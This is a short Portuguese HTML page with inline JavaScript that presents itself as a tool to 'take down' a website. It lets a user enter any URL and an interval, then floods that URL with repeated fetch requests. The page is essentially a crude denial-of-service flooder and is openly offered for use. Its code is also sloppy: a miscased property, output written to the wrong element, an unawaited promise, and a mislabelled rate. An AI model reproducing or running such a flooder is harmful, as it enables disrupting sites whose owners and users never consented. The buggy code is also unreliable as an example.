<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site maneirinho</title>
</head>
<body>
    <h1>Ataque de requisições por milesegundo!</h1>
    <label for="url">Digite a URL do site</label>
    <input type="text" id="url">    
    <br>
    <label for="url">Digite o numero de requisições por segundo!</label>
    <input type="text" id="numReq">    
    <br>
    <button id="btn">Derrubar!</button>

    <h2>Response:</h2>
    <h3  id="response"></h3>

    <script>
        document.querySelector("#btn").addEventListener('click',async ()=>{
            const url = document.querySelector("#url").value
            const numReq = document.querySelector("#numReq").value
            console.log("Numero de requisições por segundo:" +numReq)
            const responseHtml = document.querySelector("#numReq")
            setInterval(async ()=>{
                const response = await fetch(url)
                console.log(response)
                responseHtml.innerHtml = JSON.stringify(response.json()) 
            },+numReq)

        })


        // (async function(){
        //     const h1 = document.querySelector("h1")
        //     let contador = 1
        //     await sleep(2)
        //     while(true){
        //         h1.innerHTML = contador++
        //     }
            
        // }())


        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms * 1000));
        }
    </script>
</body>
</html>